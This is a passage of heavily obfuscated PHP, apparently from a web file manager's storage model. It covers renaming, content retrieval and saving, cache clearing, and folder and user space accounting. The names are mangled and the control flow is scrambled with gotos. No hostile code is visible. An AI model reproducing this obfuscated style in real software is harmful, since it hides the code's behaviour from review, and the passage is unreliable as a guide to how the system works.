d§Ü±–îŒ; d§Ü±–îŒ: $E´šÂâ¬Íã = array_unique(array_filter($E´šÂâ¬Íã)); $A»å¦…ˆó = array_unique(array_filter($A»å¦…ˆó)); if (!$E´šÂâ¬Íã) { return !1; } goto FÃà¦Õ¡â¼; FÃà¦Õ¡â¼: $côÒ›“‰½¥ = array($fƒÓö’¤Ó[410] => array($fƒÓö’¤Ó[411], $E´šÂâ¬Íã)); Model($fƒÓö’¤Ó[1969])->where($côÒ›“‰½¥)->delete(); Model($fƒÓö’¤Ó[441])->where($côÒ›“‰½¥)->delete(); goto aÏÄ®Ÿ„­; cïŠ÷éÇ‘Ÿ: for ($eœáÒç¤ = 0; $eœáÒç¤ < count($E´šÂâ¬Íã); $eœáÒç¤++) { $this->sourceCacheClear($E´šÂâ¬Íã[$eœáÒç¤]); } goto C™òÇŒØ¹Ô; C™òÇŒØ¹Ô: } public function rename($BÚÏÔ»ö‡Š, $eŠÍÂ˜ÍŞ) { goto eŠª¡¤¼ÂÔ; eŠª¡¤¼ÂÔ: $Eèºè¼«˜Â =& $_SERVER[æ§›¦ÌáØ]; $E–òëÜ¼›Â = $this->sourceInfo($BÚÏÔ»ö‡Š); if (!$E–òëÜ¼›Â) { return !1; } goto AÃ…†Öƒ¼¹; AÃ…†Öƒ¼¹: $FêØº‘‹á¢ = $this->fileNameExist($E–òëÜ¼›Â[$Eèºè¼«˜Â[478]], $eŠÍÂ˜ÍŞ); if ($FêØº‘‹á¢ && $FêØº‘‹á¢ != $BÚÏÔ»ö‡Š) { return !1; } $DƒŒ•Ìğ³… = array($Eèºè¼«˜Â[413] => $eŠÍÂ˜ÍŞ, $Eèºè¼«˜Â[565] => USER_ID); goto A«ŸÒèÕÚ; d®´–£Åç: $this->setNamePinyin($BÚÏÔ»ö‡Š, $DƒŒ•Ìğ³…[$Eèºè¼«˜Â[28]], !1); $this->updateModifyTime($E–òëÜ¼›Â[$Eèºè¼«˜Â[478]]); $F³Ÿ¨¡øĞõ = $this->where(array($Eèºè¼«˜Â[410] => $BÚÏÔ»ö‡Š))->data($DƒŒ•Ìğ³…)->save(); goto bÃŠ‹˜ÅÇ±; bÃŠ‹˜ÅÇ±: $Dƒñ¶ã«œ = $Eèºè¼«˜Â[1958] . $E–òëÜ¼›Â[$Eèºè¼«˜Â[478]]; if (isset(self::$cacheChildList[$Dƒñ¶ã«œ])) { unset(self::$cacheChildList[$Dƒñ¶ã«œ]); } return $F³Ÿ¨¡øĞõ; goto EØŞÑçöĞñ; A«ŸÒèÕÚ: if ($E–òëÜ¼›Â[$Eèºè¼«˜Â[403]] != $Eèºè¼«˜Â[87]) { $DƒŒ•Ìğ³…[$Eèºè¼«˜Â[405]] = substr(get_path_ext($eŠÍÂ˜ÍŞ), 0, 10); } Model($Eèºè¼«˜Â[546])->eventRename($BÚÏÔ»ö‡Š, $E–òëÜ¼›Â[$Eèºè¼«˜Â[28]], $eŠÍÂ˜ÍŞ); $this->sourceCacheClear($BÚÏÔ»ö‡Š); goto d®´–£Åç; EØŞÑçöĞñ: } public function setNamePinyin($cİ„ÅŒĞ„, $F—¶öØ¹, $Fé°¡Ù¨ = true) { $C¢¤¾‰ä =& $_SERVER[æ§›¦ÌáØ]; $CœŠˆ†Ã = Input::check($F—¶öØ¹, $C¢¤¾‰ä[569]); if ($Fé°¡Ù¨ && !$CœŠˆ†Ã) { return; } if (!$CœŠˆ†Ã) { $this->metaSet($cİ„ÅŒĞ„, $C¢¤¾‰ä[444], null); $this->metaSet($cİ„ÅŒĞ„, $C¢¤¾‰ä[443], null); return; } $bµŠÍïØŸµ = array($C¢¤¾‰ä[444] => str_replace($C¢¤¾‰ä[50], $C¢¤¾‰ä[33], Pinyin::encode($F—¶öØ¹)), $C¢¤¾‰ä[443] => Pinyin::encode($F—¶öØ¹, $C¢¤¾‰ä[570])); $this->metaSet($cİ„ÅŒĞ„, $bµŠÍïØŸµ); } public function getContent($C˜—Š»šö) { goto e„è–µµŸ¼; f¸œÔà²î”: if ($DÔĞ³¸£·ˆ[$A„“ˆ±Ï‡’[78]] == 0) { return $A„“ˆ±Ï‡’[33]; } $c§œˆ›Ë‰ô = $A„“ˆ±Ï‡’[1972] . $DÔĞ³¸£·ˆ[$A„“ˆ±Ï‡’[170]]; if ($DÔĞ³¸£·ˆ[$A„“ˆ±Ï‡’[78]] <= 1024 * 10) { $f‰ØµŒºöÏ = Cache::get($c§œˆ›Ë‰ô); if (!$f‰ØµŒºöÏ) { $f‰ØµŒºöÏ = IO::getContent($DÔĞ³¸£·ˆ[$A„“ˆ±Ï‡’[76]]); Cache::set($c§œˆ›Ë‰ô, $f‰ØµŒºöÏ); } return $f‰ØµŒºöÏ; } goto e‚¬ğÅñ; e‚¬ğÅñ: if (!$DÔĞ³¸£·ˆ[$A„“ˆ±Ï‡’[76]]) { return $A„“ˆ±Ï‡’[33]; } return IO::getContent($DÔĞ³¸£·ˆ[$A„“ˆ±Ï‡’[76]]); goto fÀššõ–‹ª; e„è–µµŸ¼: $A„“ˆ±Ï‡’ =& $_SERVER[æ§›¦ÌáØ]; $DÔĞ³¸£·ˆ = $this->fileInfoGet($C˜—Š»šö); if (!$DÔĞ³¸£·ˆ) { return !1; } goto f¸œÔà²î”; fÀššõ–‹ª: } public function setDesc($AÆÔ”‚êêë, $a¤‰ÆŒ¿Ç×) { $cáâ°¦å =& $_SERVER[æ§›¦ÌáØ]; Model($cáâ°¦å[546])->eventAddDesc($AÆÔ”‚êêë, $a¤‰ÆŒ¿Ç×); return $this->metaSet($AÆÔ”‚êêë, $cáâ°¦å[431], $a¤‰ÆŒ¿Ç×); } public function setContent($bƒ¼‹íñ, $DØ­Ş¯µ¼ê = '') { goto eÆİó½‘‚; D£Âìùì: if (!$bÒ²õæÈ¯Ö || !$EÔÃ±”ëÇ) { return !1; } $døĞš‰›İ = Model($EŒ…ÜÃñë[450])->addFileByContent($DØ­Ş¯µ¼ê, $EÔÃ±”ëÇ[$EŒ…ÜÃñë[28]]); $Bùƒ¹“Â®ê = $this->fileHistory($EÔÃ±”ëÇ, $døĞš‰›İ[$EŒ…ÜÃñë[447]], $døĞš‰›İ[$EŒ…ÜÃñë[78]]); goto A§¿å¬×Â¦; eÆİó½‘‚: $EŒ…ÜÃñë =& $_SERVER[æ§›¦ÌáØ]; $EÔÃ±”ëÇ = $this->sourceInfo($bƒ¼‹íñ); $bÒ²õæÈ¯Ö = $this->fileInfoGet($bƒ¼‹íñ); goto D£Âìùì; A§¿å¬×Â¦: if (!$Bùƒ¹“Â®ê) { return Model($EŒ…ÜÃñë[450])->remove($døĞš‰›İ[$EŒ…ÜÃñë[447]]); } $this->folderSizeReset($EÔÃ±”ëÇ[$EŒ…ÜÃñë[478]]); return !0; goto dùìİŠæ—ˆ; dùìİŠæ—ˆ: } public function fileSubstr($Bç£áØó§´, $aŸœÇÎ…Â¥, $f›‘ºÈ¯Îœ) { $Cê¯ºÄ‹Ñ = $this->fileInfoGet($Bç£áØó§´); if (!$Cê¯ºÄ‹Ñ) { return !1; } return IO::fileSubstr($Cê¯ºÄ‹Ñ[$_SERVER[æ§›¦ÌáØ][76]], $aŸœÇÎ…Â¥, $f›‘ºÈ¯Îœ); } public function fileInfoGet($Cé­£ ÀÅ¸) { goto a©ğ„Œ›Ÿ­; eâ”•®Øí: $eŒÏ‚êè› = $cóÌˆ†Š³[453] . $bõ‘‘ã–×[$cóÌˆ†Š³[447]]; $BÍó¨Şßì® = _get(self::$cacheFileInfo, $eŒÏ‚êè›); if ($BÍó¨Şßì®) { return $BÍó¨Şßì®; } goto a†Å¢®„Ôç; a†Å¢®„Ôç: $eÖ—‡šçÓ‰ = Model($cóÌˆ†Š³[450])->fileInfo($bõ‘‘ã–×[$cóÌˆ†Š³[447]]); if ($eÖ—‡šçÓ‰) { $eÖ—‡šçÓ‰[$cóÌˆ†Š³[28]] = $bõ‘‘ã–×[$cóÌˆ†Š³[28]]; } self::$cacheFileInfo[$eŒÏ‚êè›] = $eÖ—‡šçÓ‰; goto a¼—ƒºÍù; a©ğ„Œ›Ÿ­: $cóÌˆ†Š³ =& $_SERVER[æ§›¦ÌáØ]; $bõ‘‘ã–× = $this->sourceInfo($Cé­£ ÀÅ¸); if (!$bõ‘‘ã–× || $bõ‘‘ã–×[$cóÌˆ†Š³[403]]) { return !1; } goto eâ”•®Øí; a¼—ƒºÍù: return $eÖ—‡šçÓ‰; goto dÉ…Œ˜àÄË; dÉ…Œ˜àÄË: } private function folderChildrenNumber($FÇíˆÕ·êÖ) { $dÓ–í‹Œ¤ê =& $_SERVER[æ§›¦ÌáØ]; $BòŞïÈ‰°° = $this->sourceInfo($FÇíˆÕ·êÖ); $C’ÚÊŞ‘Òà = array($dÓ–í‹Œ¤ê[566] => array($dÓ–í‹Œ¤ê[525], $BòŞïÈ‰°°[$dÓ–í‹Œ¤ê[502]] . $FÇíˆÕ·êÖ . $dÓ–í‹Œ¤ê[526]), $dÓ–í‹Œ¤ê[422] => intval($BòŞïÈ‰°°[$dÓ–í‹Œ¤ê[423]]), $dÓ–í‹Œ¤ê[559] => 1); $Fš¿¯ëšÎ¶ = $this->where($C’ÚÊŞ‘Òà)->count(); $fö¯©·Šâ = $this->where($C’ÚÊŞ‘Òà)->where(array($dÓ–í‹Œ¤ê[559] => 0))->count(); return array($dÓ–í‹Œ¤ê[82] => $fö¯©·Šâ, $dÓ–í‹Œ¤ê[83] => $Fš¿¯ëšÎ¶); } public function pathInfo($BÒè½ªå°Ö, $C¤À’äˆîÚ = false) { goto BÉ¢´ëâ‰¾; BÉ¢´ëâ‰¾: $CÔÑˆ¦›§Š =& $_SERVER[æ§›¦ÌáØ]; $C¤À’äˆîÚ = !1; $BÒè½ªå°Ö = intval($BÒè½ªå°Ö); goto e‡·˜óçë÷; e‡·˜óçë÷: $F´´ˆŒóæ® = $CÔÑˆ¦›§Š[439] . intval($C¤À’äˆîÚ) . $CÔÑˆ¦›§Š[440] . $BÒè½ªå°Ö; $e‹½â¹÷èÇ = _get(self::$cachePathInfo, $F´´ˆŒóæ®); if ($e‹½â¹÷èÇ) { return $e‹½â¹÷èÇ; } goto F•½‰ºÜ÷Ó; F•½‰ºÜ÷Ó: $dª§¶“¡Ÿš = $this->sourceInfo($BÒè½ªå°Ö); if (!$dª§¶“¡Ÿš) { return !1; } $dª§¶“¡Ÿš = $this->_listDataApplyItem($dª§¶“¡Ÿš, $C¤À’äˆîÚ); goto B÷Ğ´Ù¤Ì®; B÷Ğ´Ù¤Ì®: self::$cachePathInfo[$F´´ˆŒóæ®] = $dª§¶“¡Ÿš; return $dª§¶“¡Ÿš; goto eÕ²àºÜÙŒ; eÕ²àºÜÙŒ: } public static $cachePathInfoMore = array(); public function pathInfoMore($Bä´Ú‹³‰á) { goto fãŠº¡¼îŞ; Eìã¦¬èñÂ: $aÃâÇµù²ç = $this->pathInfo($Bä´Ú‹³‰á); if (!$aÃâÇµù²ç) { return !1; } if ($aÃâÇµù²ç[$cğ²õƒ Æ[403]] == $cğ²õƒ Æ[87]) { $aÃâÇµù²ç[$cğ²õƒ Æ[81]] = $this->folderChildrenNumber($Bä´Ú‹³‰á); } goto BÂ·óÙÔŠø; fãŠº¡¼îŞ: $cğ²õƒ Æ =& $_SERVER[æ§›¦ÌáØ]; $AİñÍ¼ô¼ = _get(self::$cachePathInfoMore, $Bä´Ú‹³‰á); if ($AİñÍ¼ô¼) { return $AİñÍ¼ô¼; } goto Eìã¦¬èñÂ; BÂ·óÙÔŠø: self::$cachePathInfoMore[$Bä´Ú‹³‰á] = $aÃâÇµù²ç; return $aÃâÇµù²ç; goto b¯ãÌŞ–´ö; b¯ãÌŞ–´ö: } public function sourceInfo($fáªŠÁîÃÇ) { goto F›‘ØŠÖ¦À; D“òôÃÈ–Í: $e¸áÒÊ˜ÄŠ = $A²¨ŒÍâ¦Á[438] . $fáªŠÁîÃÇ; $b¤Í…õÓÁ = _get(self::$cacheSourceInfo, $e¸áÒÊ˜ÄŠ); if ($b¤Í…õÓÁ) { return $b¤Í…õÓÁ; } goto Cƒ¬‡½óÄÛ; F›‘ØŠÖ¦À: $A²¨ŒÍâ¦Á =& $_SERVER[æ§›¦ÌáØ]; if (!$fáªŠÁîÃÇ) { return array(); } $fáªŠÁîÃÇ = intval($fáªŠÁîÃÇ); goto D“òôÃÈ–Í; Cƒ¬‡½óÄÛ: $Aõƒˆ£Í¾¥ = $this->where(array($A²¨ŒÍâ¦Á[395] => $fáªŠÁîÃÇ))->find(); self::$cacheSourceInfo[$e¸áÒÊ˜ÄŠ] = $Aõƒˆ£Í¾¥; return self::$cacheSourceInfo[$e¸áÒÊ˜ÄŠ]; goto bÔ«ò¯¼; bÔ«ò¯¼: } public function sourceCacheClear($a”±ì„‚î… = false) { self::cacheClear($a”±ì„‚î…); } public static function cacheClear($F£ƒó¤âİ¯ = false) { $E³ÊŞÔŸõ¹ =& $_SERVER[æ§›¦ÌáØ]; if ($F£ƒó¤âİ¯ == !1) { goto eä¡‘‘’ßĞ; eä¡‘‘’ßĞ: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto C‚³“Ö„¬‘; F’¨ƒ¨ñ­µ: return; goto f£¢³š’¿; C‚³“Ö„¬‘: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto F’¨ƒ¨ñ­µ; f£¢³š’¿: } unset(self::$cacheSourceInfo[$E³ÊŞÔŸõ¹[438] . $F£ƒó¤âİ¯]); unset(self::$cachePathInfoMore[$F£ƒó¤âİ¯]); unset(self::$cachePathInfo[$E³ÊŞÔŸõ¹[1973] . $F£ƒó¤âİ¯]); unset(self::$cachePathInfo[$E³ÊŞÔŸõ¹[1974] . $F£ƒó¤âİ¯]); } public function metaSet($eš¤Î‘¨‘­, $E©ëä‹…åÁ = null, $D„óÀ’¯•Ù = null) { $cŒ¦‹Ù¿„ = parent::metaSet($eš¤Î‘¨‘­, $E©ëä‹…åÁ, $D„óÀ’¯•Ù); if ($cŒ¦‹Ù¿„) { $this->sourceCacheClear($eš¤Î‘¨‘­); } return $cŒ¦‹Ù¿„; } public function pathInfoByPath($DÊƒ£ÊÛ´Š, $D‘±Ğ’èó) { $c¼è—ˆ«ï‰ =& $_SERVER[æ§›¦ÌáØ]; $b›‹ÑàÑ¸Ò = !$D‘±Ğ’èó ? array() : explode($c¼è—ˆ«ï‰[8], trim($D‘±Ğ’èó, $c¼è—ˆ«ï‰[8])); $AßÆ‡ÎÁ¦½ = $DÊƒ£ÊÛ´Š; foreach ($b›‹ÑàÑ¸Ò as $cóÆÌ×Ğ‘¡) { $B§¥§Ñ¢Ó = array($c¼è—ˆ«ï‰[478] => $AßÆ‡ÎÁ¦½, $c¼è—ˆ«ï‰[28] => $cóÆÌ×Ğ‘¡); $A»é÷—¡ë… = $this->where($B§¥§Ñ¢Ó)->select(); if (!$A»é÷—¡ë…) { return !1; } $A»é÷—¡ë… = array_sort_by($A»é÷—¡ë…, $c¼è—ˆ«ï‰[423]); $AßÆ‡ÎÁ¦½ = $A»é÷—¡ë…[0][$c¼è—ˆ«ï‰[395]]; } return $this->pathInfo($AßÆ‡ÎÁ¦½, !0); } protected function updateModifyTime($E‚ìœËßñ) { goto E­†ªÕ»×¯; DÕÉÀå¿Ç½: $e´ĞÛ ‹öË = array($câ®éÄÇ¬Í[565] => $EÁµ°—‹˜, $câ®éÄÇ¬Í[417] => time()); $this->where($dÂ©Ù‹¯¶³)->save($e´ĞÛ ‹öË); goto fËè‘¥¿˜Ú; B¢ç¥Ã»…‚: if (!is_array($E‚ìœËßñ)) { $E‚ìœËßñ = array($E‚ìœËßñ); } foreach ($E‚ìœËßñ as $FÑßš·éœŒ => $EÛŞèò¶ÏÂ) { $E‚ìœËßñ[$FÑßš·éœŒ] = intval($EÛŞèò¶ÏÂ); $this->sourceCacheClear($EÛŞèò¶ÏÂ); } $dÂ©Ù‹¯¶³ = array($câ®éÄÇ¬Í[395] => array($câ®éÄÇ¬Í[7], $E‚ìœËßñ)); goto DÕÉÀå¿Ç½; E­†ªÕ»×¯: $câ®éÄÇ¬Í =& $_SERVER[æ§›¦ÌáØ]; $EÁµ°—‹˜ = defined($câ®éÄÇ¬Í[454]) ? USER_ID : $câ®éÄÇ¬Í[191]; if (!$E‚ìœËßñ) { return; } goto B¢ç¥Ã»…‚; fËè‘¥¿˜Ú: } public function folderSizeReset($C±³Ñ£¼·, $B¦­é„¬Ÿé = false) { goto C¥¾²ªÅøÏ; aÂôÎ: $D´¦•¼“¿İ = array($aÒ¨‹£¿[$d«ïÇ‹ğ¿÷[404]], $aÒ¨‹£¿[$d«ïÇ‹ğ¿÷[484]]); TaskRun::timeLimitCall($FŠê®±ò¹°, $d«ïÇ‹ğ¿÷[1977], $D´¦•¼“¿İ, 1.5); goto Bì½ì‘øòù; d„ß—¬íˆ•: $cª—±ÓçŒÆ[] = $aÒ¨‹£¿[$d«ïÇ‹ğ¿÷[395]]; $a‡ «ôÛÔ = array($d«ïÇ‹ğ¿÷[395] => array($d«ïÇ‹ğ¿÷[411], $cª—±ÓçŒÆ)); if ($B¦­é„¬Ÿé < 0) { $a‡ «ôÛÔ[$d«ïÇ‹ğ¿÷[78]] = array($d«ïÇ‹ğ¿÷[963], abs($B¦­é„¬Ÿé)); } goto Cğ‰À…¯Š; Cğ‰À…¯Š: $this->where($a‡ «ôÛÔ)->setAdd($d«ïÇ‹ğ¿÷[78], $B¦­é„¬Ÿé); CacheLock::unlock($Bí©óŠíÁ÷); $FŠê®±ò¹° = $d«ïÇ‹ğ¿÷[1976] . $aÒ¨‹£¿[$d«ïÇ‹ğ¿÷[404]] . $d«ïÇ‹ğ¿÷[4] . $aÒ¨‹£¿[$d«ïÇ‹ğ¿÷[484]]; goto aÂôÎ; C¥¾²ªÅøÏ: $d«ïÇ‹ğ¿÷ =& $_SERVER[æ§›¦ÌáØ]; if ($this->statusIgnoreResetSpace) { return; } $aÒ¨‹£¿ = $this->sourceInfo($C±³Ñ£¼·); goto fÌÆ…Ÿäñ; EÑÇåãÏ·: if ($B¦­é„¬Ÿé == 0) { return CacheLock::unlock($Bí©óŠíÁ÷); } $cª—±ÓçŒÆ = $this->parentLevelArray($aÒ¨‹£¿[$d«ïÇ‹ğ¿÷[502]]); if (!$cª—±ÓçŒÆ) { $cª—±ÓçŒÆ = array(); } goto d„ß—¬íˆ•; fÌÆ…Ÿäñ: $Bí©óŠíÁ÷ = $d«ïÇ‹ğ¿÷[1975] . $C±³Ñ£¼·; CacheLock::lock($Bí©óŠíÁ÷, 20); if ($B¦­é„¬Ÿé === !1) { $this->sourceCacheClear($C±³Ñ£¼·); $aÒ¨‹£¿ = $this->sourceInfo($C±³Ñ£¼·); $a‡ «ôÛÔ = array($d«ïÇ‹ğ¿÷[394] => $C±³Ñ£¼·, $d«ïÇ‹ğ¿÷[422] => 0); $fÍÂÖÃ °™ = $this->where($a‡ «ôÛÔ)->sum($d«ïÇ‹ğ¿÷[78]); $B¦­é„¬Ÿé = intval($fÍÂÖÃ °™) - intval($aÒ¨‹£¿[$d«ïÇ‹ğ¿÷[78]]); } goto EÑÇåãÏ·; Bì½ì‘øòù: } public function folderSizeResetChildren($cŸ‰ğ„Ú¯†) { goto b¶±ª¾®‰; B˜Áî˜îÙ¶: $aàÑÆ³ÃñÜ[$e¯µØìĞ½­[403]] = 0; $aƒÚª¿Á¹í = $this->field($Bºš—²ÙÈ)->where($aàÑÆ³ÃñÜ)->select(); if (!$aƒÚª¿Á¹í) { return; } goto f™•¡è¬ªÆ; b¶±ª¾®‰: $e¯µØìĞ½­ =& $_SERVER[æ§›¦ÌáØ]; $this->sourceCacheClear($cŸ‰ğ„Ú¯†); $b†¸¾Ÿ…Î‹ = $this->sourceInfo($cŸ‰ğ„Ú¯†); goto BÕÄÑ‹ğ³Š; d²‰æ¿£‰¸: foreach ($aƒÚª¿Á¹í as $E•·¿®í‘È) { $b˜Ø©˜Æ…â = $E•·¿®í‘È[$e¯µØìĞ½­[478]] . $e¯µØìĞ½­[33]; if (!isset($DàˆÉá’‘Õ[$b˜Ø©˜Æ…â])) { continue; } if ($E•·¿®í‘È[$e¯µØìĞ½­[423]] == $DàˆÉá’‘Õ[$b˜Ø©˜Æ…â][$e¯µØìĞ½­[423]]) { $DàˆÉá’‘Õ[$b˜Ø©˜Æ…â][$e¯µØìĞ½­[78]] += $E•·¿®í‘È[$e¯µØìĞ½­[78]]; } } foreach ($DàˆÉá’‘Õ as $E•·¿®í‘È) { $AáóÊÇ÷Ê = $this->parentLevelArray($E•·¿®í‘È[$e¯µØìĞ½­[502]]); foreach ($AáóÊÇ÷Ê as $b˜Ø©˜Æ…â) { $b˜Ø©˜Æ…â = $b˜Ø©˜Æ…â . $e¯µØìĞ½­[33]; if (!isset($DàˆÉá’‘Õ[$b˜Ø©˜Æ…â])) { continue; } if ($E•·¿®í‘È[$e¯µØìĞ½­[423]] == $DàˆÉá’‘Õ[$b˜Ø©˜Æ…â][$e¯µØìĞ½­[423]]) { $DàˆÉá’‘Õ[$b˜Ø©˜Æ…â][$e¯µØìĞ½­[78]] += $E•·¿®í‘È[$e¯µØìĞ½­[78]]; } } } $aŠìñ®’·ù = array(); goto F¤¦¯Á›½“; f™•¡è¬ªÆ: $DàˆÉá’‘Õ[] = $b†¸¾Ÿ…Î‹; $DàˆÉá’‘Õ = array_to_keyvalue($DàˆÉá’‘Õ, $e¯µØìĞ½­[395]); foreach ($DàˆÉá’‘Õ as $dè´è²›‘‘ => $E•·¿®í‘È) { $DàˆÉá’‘Õ[$dè´è²›‘‘][$e¯µØìĞ½­[1979]] = $DàˆÉá’‘Õ[$dè´è²›‘‘][$e¯µØìĞ½­[78]]; $DàˆÉá’‘Õ[$dè´è²›‘‘][$e¯µØìĞ½­[78]] = 0; } goto d²‰æ¿£‰¸; F¤¦¯Á›½“: foreach ($DàˆÉá’‘Õ as $E•·¿®í‘È) { if ($E•·¿®í‘È[$e¯µØìĞ½­[78]] == $E•·¿®í‘È[$e¯µØìĞ½­[1979]]) { continue; } $aŠìñ®’·ù[] = array($e¯µØìĞ½­[395], $E•·¿®í‘È[$e¯µØìĞ½­[395]], $e¯µØìĞ½­[78], $E•·¿®í‘È[$e¯µØìĞ½­[78]]); } $this->saveAll($aŠìñ®’·ù); goto cÌ‡ÅëìÔÙ; BÕÄÑ‹ğ³Š: $aàÑÆ³ÃñÜ = array($e¯µØìĞ½­[559] => 1, $e¯µØìĞ½­[566] => array($e¯µØìĞ½­[525], $b†¸¾Ÿ…Î‹[$e¯µØìĞ½­[502]] . $cŸ‰ğ„Ú¯† . $e¯µØìĞ½­[526])); $Bºš—²ÙÈ = $e¯µØìĞ½­[1978]; $DàˆÉá’‘Õ = $this->field($Bºš—²ÙÈ)->where($aàÑÆ³ÃñÜ)->select(); goto B˜Áî˜îÙ¶; cÌ‡ÅëìÔÙ: } public function userSpaceReset($AÇ¸ô¢ÎŠí = false) { $C½°â”Æºé =& $_SERVER[æ§›¦ÌáØ]; $Dïğ¬æôÓ = $this->where(array($C½°â”Æºé[404] => self::TYPE_USER, $C½°â”Æºé[484] => $AÇ¸ô¢ÎŠí, $C½°â”Æºé[403] => 0))->sum($C½°â”Æºé[78]); $Dïğ¬æôÓ = !$Dïğ¬æôÓ || $Dïğ¬æôÓ <= 0 ? 0 : $Dïğ¬æôÓ; Model($C½°â”Æºé[494])->userEdit($AÇ¸ô¢ÎŠí, array($C½°â”Æºé[1675] => $Dïğ¬æôÓ)); } public function targetSpaceUpdate($D±¢ˆ¹ˆôê, $FĞÈçà×Ï‰) { $dÏãİ˜íÊå =& $_SERVER[æ§›¦ÌáØ]; if (!$FĞÈçà×Ï‰) { return; } if (!in_array($D±¢ˆ¹ˆôê, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $EãŠŸ“£“¯ = $this->targetSpaceSize($D±¢ˆ¹ˆôê, $FĞÈçà×Ï‰); if ($D±¢ˆ¹ˆôê == self::TYPE_USER) { Model($dÏãİ˜íÊå[494])->userEdit($FĞÈçà×Ï‰, array($dÏãİ˜íÊå[1675] => $EãŠŸ“£“¯)); } else { if ($D±¢ˆ¹ˆôê == self::TYPE_GROUP) { Model($dÏãİ˜íÊå[503])->groupEdit($FĞÈçà×Ï‰, array($dÏãİ˜íÊå[1675] => $EãŠŸ“£“¯)); } } } public function targetSpaceSize($FÙ¢®Œ¿Õ, $A×¹ŒÔñÆ) { goto d÷óÅ¦‹Ïš; A©ƒáºÉ: $AÀî½ö­º = !$AÀî½ö­º || $AÀî½ö­º <= 0 ? 0 : $AÀî½ö­º; return $AÀî½ö­º; goto cÙ°‚¥ÜÅ”; EÖ¤Ôè•Š´: $D¢œÛùœ” = array_to_keyvalue($D¢œÛùœ”, $dºÄÈÛçÄè[33], $dºÄÈÛçÄè[395]); $D¢œÛùœ” = array_unique(array_filter($D¢œÛùœ”)); if ($D¢œÛùœ”) { $c¡ÕºÓ­ŒË = array($dºÄÈÛçÄè[410] => array($dºÄÈÛçÄè[411], $D¢œÛùœ”)); $AÀî½ö­º += floatval($this->where($c¡ÕºÓ­ŒË)->sum($dºÄÈÛçÄè[78])); } goto A©ƒáºÉ; d÷óÅ¦‹Ïš: $dºÄÈÛçÄè =& $_SERVER[æ§›¦ÌáØ]; $f¸Ô»¶¥ï± = $this->sourceRoot($FÙ¢®Œ¿Õ, $A×¹ŒÔñÆ, !0); if (!$f¸Ô»¶¥ï±) { return 0; } goto DÑò´î»Ê…; DÑò´î»Ê…: $AÀî½ö­º = floatval($f¸Ô»¶¥ï±[$dºÄÈÛçÄè[78]]); $c¡ÕºÓ­ŒË = array($dºÄÈÛçÄè[566] => array($dºÄÈÛçÄè[525], $dºÄÈÛçÄè[512] . $f¸Ô»¶¥ï±[$dºÄÈÛçÄè[395]] . $dºÄÈÛçÄè[526])); $D¢œÛùœ” = Model($dºÄÈÛçÄè[421])->field($dºÄÈÛçÄè[410])->where($c¡ÕºÓ­ŒË)->select(); goto EÖ¤Ôè•Š´; cÙ°‚¥ÜÅ”: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($b…šÆ÷®³Î) { return $this->fileTypeProfile($b…šÆ÷®³Î, SourceModel::TYPE_USER); } public function groupFileTypeProfile($D…†é¾¿ù») { return $this->fileTypeProfile($D…†é¾¿ù», SourceModel::TYPE_GROUP); } private function fileTypeProfile($bï‹ñ¹øôÊ, $eÇ‚¢¼À©æ) { goto CŸÅË©¬¾É; E‚µé«×¡ó: foreach ($b¸ï‹º™¿î as $B²ĞåÄÉ¸ø => $Bó¨Üß­é) { $B™„ëÈÓíó[$f÷Œ ºÄÈ[405]] = $this->fileTypeWhere($B²ĞåÄÉ¸ø); $F§‰¡¬çáš[$B²ĞåÄÉ¸ø] = array($f÷Œ ºÄÈ[1982] => $Bó¨Üß­é[$f÷Œ ºÄÈ[28]], $f÷Œ ºÄÈ[1983] => $this->where($B™„ëÈÓíó)->count(), $f÷Œ ºÄÈ[561] => $this->where($B™„ëÈÓíó)->sum($f÷Œ ºÄÈ[78])); } Cache::set($Aá¶ã´—¹ä, $F§‰¡¬çáš, 1200); return $F§‰¡¬çáš; goto b¡É»¶‰šº; CŸÅË©¬¾É: $f÷Œ ºÄÈ =& $_SERVER[æ§›¦ÌáØ]; $Aá¶ã´—¹ä = $f÷Œ ºÄÈ[1980] . $bï‹ñ¹øôÊ . $f÷Œ ºÄÈ[71] . $eÇ‚¢¼À©æ; $FÖ’³´×Å = Cache::get($Aá¶ã´—¹ä); goto cºĞßŞºèÉ; cºĞßŞºèÉ: if ($FÖ’³´×Å) { return $FÖ’³´×Å; } $B™„ëÈÓíó = array($f÷Œ ºÄÈ[559] => 0); if ($bï‹ñ¹øôÊ != !1) { $B™„ëÈÓíó[$f÷Œ ºÄÈ[484]] = $bï‹ñ¹øôÊ; $B™„ëÈÓíó[$f÷Œ ºÄÈ[404]] = $eÇ‚¢¼À©æ; } goto b‘é†óñ¢„; b‘é†óñ¢„: $F§‰¡¬çáš = array(); $F§‰¡¬çáš[$f÷Œ ºÄÈ[1981]] = array($f÷Œ ºÄÈ[1982] => LNG($f÷Œ ºÄÈ[1981]), $f÷Œ ºÄÈ[1983] => $this->where($B™„ëÈÓíó)->count(), $f÷Œ ºÄÈ[561] => $this->where($B™„ëÈÓíó)->sum($f÷Œ ºÄÈ[78])); $b¸ï‹º™¿î = KodIO::fileTypeList(); goto E‚µé«×¡ó; b¡É»¶‰šº: } public function fileNameExist($c†Ó¯¶ê, $c•º¼»¿‡) { $A·´’¨öº =& $_SERVER[æ§›¦ÌáØ]; $D†ËÆäçŒà = $this->where(array($A·´’¨öº[478] => $c†Ó¯¶ê, $A·´’¨öº[28] => $c•º¼»¿‡, $A·´’¨öº[423] => 0))->find(); return is_array($D†ËÆäçŒà) ? $D†ËÆäçŒà[$A·´’¨öº[395]] : !1; } public function childList($bÁ²ŞÉµÉÈ) { goto bí¥Ô§ˆ¦±; a†‘†ùîç¥: self::$cacheChildList[$c£­’¼÷ñÈ] = $C³ëëùÁ„ˆ; foreach ($C³ëëùÁ„ˆ as $AïÚ­´‘·) { $c£­’¼÷ñÈ = $E™ĞÚ½İİ[438] . $AïÚ­´‘·[$E™ĞÚ½İİ[395]]; self::$cacheSourceInfo[$c£­’¼÷ñÈ] = $AïÚ­´‘·; } return $C³ëëùÁ„ˆ; goto B¯îâ—å’; bí¥Ô§ˆ¦±: $E™ĞÚ½İİ =& $_SERVER[æ§›¦ÌáØ]; $c£­’¼÷ñÈ = $E™ĞÚ½İİ[1958] . $bÁ²ŞÉµÉÈ; if 